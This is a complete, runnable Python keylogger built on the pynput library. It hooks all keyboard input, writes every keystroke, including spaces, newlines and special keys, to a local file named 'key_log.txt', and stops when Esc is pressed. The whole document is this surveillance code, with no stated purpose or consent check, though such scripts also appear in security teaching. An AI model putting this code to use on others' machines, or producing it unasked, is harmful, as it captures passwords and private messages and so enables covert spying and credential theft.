from pynput import keyboard

# File to save the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as log:
                log.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as log:
                log.write("\n")
        else:
            with open(log_file, "a") as log:
                log.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
